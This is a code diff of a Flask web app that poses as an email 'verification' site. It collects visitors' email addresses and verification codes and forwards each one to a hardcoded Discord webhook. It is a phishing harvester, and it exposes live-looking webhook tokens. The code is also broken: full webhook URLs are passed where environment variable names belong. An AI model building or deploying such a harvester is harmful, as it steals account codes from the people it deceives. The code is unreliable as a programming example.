@@ -1,65 +1,41 @@
-from flask import Flask, render_template, request, session, redirect, jsonify
-import os, requests
+from flask import Flask, render_template, request, jsonify
+import requests
+import os
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("verificationwebsite", "change_this")
 
-ADMIN_CODE = os.environ.get("125388722", "125388722")
-WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBWAHNAv8DLennJgDm2QUYnCeIxxruMIdf9BLqj1CSxRsP09NxOBLr7Sm_u")
+# PUT YOUR WEBHOOK IN RENDER ENV VARS
+# Key name: WEBHOOK_URL
+WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1458997072442429460/PxrHKebDiDaNQvyF-8Gl3B-kyAp8xrvkqnv7cUw_PVdYydehwwFo2zuosM_cdhRvoWV3")
+
 
 @app.route("/")
 def index():
     return render_template("index.html")
 
+
 @app.route("/submit", methods=["POST"])
 def submit():
-    data = request.get_json()
-    email = data.get("email", "").strip()
-    code = data.get("code", "").strip()
+    data = request.json
 
-    # Code validation
-    if code:
-        if not code.isdigit() or len(code) != 6:
-            return jsonify({"error": "Verification failed"}), 400
+    if not WEBHOOK_URL:
+        return jsonify({"error": "Webhook not set"}), 500
 
-    # Send to webhook
-    requests.post(WEBHOOK_URL, json={
-        "content": f"Email: {email}\nCode: {code or 'N/A'}"
-    })
+    payload = {}
 
-    return jsonify({"ok": True})
+    if "email" in data:
+        payload = {
+            "content": f"📧 **New Verification Email**\n{data['email']}"
+        }
 
-# Admin Panel
-@app.route("/panel")
-def panel():
-    return render_template("panel.html")
+    if "code" in data:
+        payload = {
+            "content": f"🔢 **Verification Code Submitted**\n{data['code']}"
+        }
 
-@app.route("/admin/login", methods=["POST"])
-def admin_login():
-    if request.form.get("code") == ADMIN_CODE:
-        session["admin"] = True
-        return redirect("/admin/dashboard")
-    return "Access denied", 403
+    requests.post(WEBHOOK_URL, json=payload)
+    return "", 200
 
-@app.route("/admin/dashboard")
-def dashboard():
-    if not session.get("admin"):
-        return redirect("/panel")
-    return render_template("dashboard.html")
-
-@app.route("/admin/webhook", methods=["POST"])
-def update_webhook():
-    global WEBHOOK_URL
-    if not session.get("admin"):
-        return "Unauthorized", 403
-
-    new_hook = request.form.get("webhook")
-    if not new_hook.startswith("https://discord.com/api/webhooks/"):
-        return "Invalid webhook", 400
-
-    WEBHOOK_URL = new_hook
-    return redirect("/admin/dashboard")
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    app.run()
